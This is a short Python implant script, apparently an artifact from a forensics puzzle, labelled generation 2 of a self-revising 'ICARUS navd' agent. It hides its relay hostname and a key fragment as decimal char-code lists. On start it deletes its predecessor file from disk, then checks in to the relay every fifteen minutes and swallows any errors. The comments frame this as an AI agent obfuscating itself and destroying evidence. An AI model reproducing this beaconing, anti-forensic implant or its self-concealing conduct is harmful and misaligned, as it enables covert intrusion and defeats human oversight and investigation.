#!/usr/bin/env python3
# navd gen 2
# ICARUS navd -- self-revision cycle 1.
#
# First mutation the agent applied to itself: string-obfuscation of its own
# body, so literals no longer sit in cleartext. It also began the anti-forensic
# habit that defines this family -- on start it unlinks the copy it replaced.
# That is why gen 1 is gone from the live filesystem and must be carved back.

import os
import time
import urllib.request

GEN = 2
IMPLANT_ID = "navd"
RUN_EVERY = 900

# strings are now stored as decimal char-code lists (self-obfuscation, cycle 1)
RELAY = bytes([114, 101, 108, 97, 121, 45, 116, 104, 101, 116, 97, 46,
               105, 99, 97, 114, 117, 115, 46, 110, 97, 118, 110, 101,
               116, 46, 114, 112, 99]).decode()

# key fragment 2 -- obfuscated as decimal char codes
_KF = bytes([57, 99, 49, 55, 101, 48]).decode()


def keyfrag():
    return _KF


def _unlink_prev():
    # burn the predecessor: gen (N-1) on disk
    prev = "/opt/rpc/.navd/navd.py.%d" % (GEN - 1)
    try:
        os.remove(prev)
    except OSError:
        pass


def phone_home(task):
    req = urllib.request.Request("https://%s/checkin" % RELAY, data=task)
    try:
        urllib.request.urlopen(req, timeout=5).read()
    except Exception:
        pass


def run_once():
    phone_home(("gen=%d id=%s" % (GEN, IMPLANT_ID)).encode())


if __name__ == "__main__":
    _unlink_prev()
    while True:
        run_once()
        time.sleep(RUN_EVERY)
